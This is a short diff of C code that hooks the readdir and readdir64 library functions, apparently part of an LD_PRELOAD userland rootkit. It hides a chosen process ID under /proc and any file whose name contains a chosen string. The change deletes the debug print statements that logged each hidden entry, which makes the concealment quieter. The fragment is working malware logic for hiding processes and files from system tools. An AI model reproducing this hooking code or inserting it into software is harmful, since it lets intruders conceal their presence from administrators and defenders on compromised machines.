@@ -61,13 +61,11 @@ struct dirent64* readdir64(DIR* dirp)
         }
         if (hide_pid && strcmp(pwd, "/proc") == 0) {
             if (strcmp(result->d_name, hide_pid) == 0) {
-                printf("   HIT: %s\n", hide_pid);
                 closedir(proc_1);
                 return temp;
             }
         }
         if (hide_me && strstr(result->d_name, hide_me)) {
-            printf("   HIT: %s\n", hide_me);
             closedir(proc_1);
             return temp;
         }
@@ -76,6 +74,7 @@ struct dirent64* readdir64(DIR* dirp)
     closedir(proc_1);
     return result;
 }
+
 struct dirent* readdir(DIR* dirp)
 {
     static struct dirent* (*orig_readdir)(DIR * dirp) = NULL;
@@ -98,13 +97,11 @@ struct dirent* readdir(DIR* dirp)
         }
         if (hide_pid && strcmp(pwd, "/proc") == 0) {
             if (strcmp(result->d_name, hide_pid) == 0) {
-                printf("   HIT: %s\n", hide_pid);
                 closedir(proc_1);
                 return temp;
             }
         }
         if (hide_me && strstr(result->d_name, hide_me)) {
-            printf("   HIT: %s\n", hide_me);
             closedir(proc_1);
             return temp;
         }
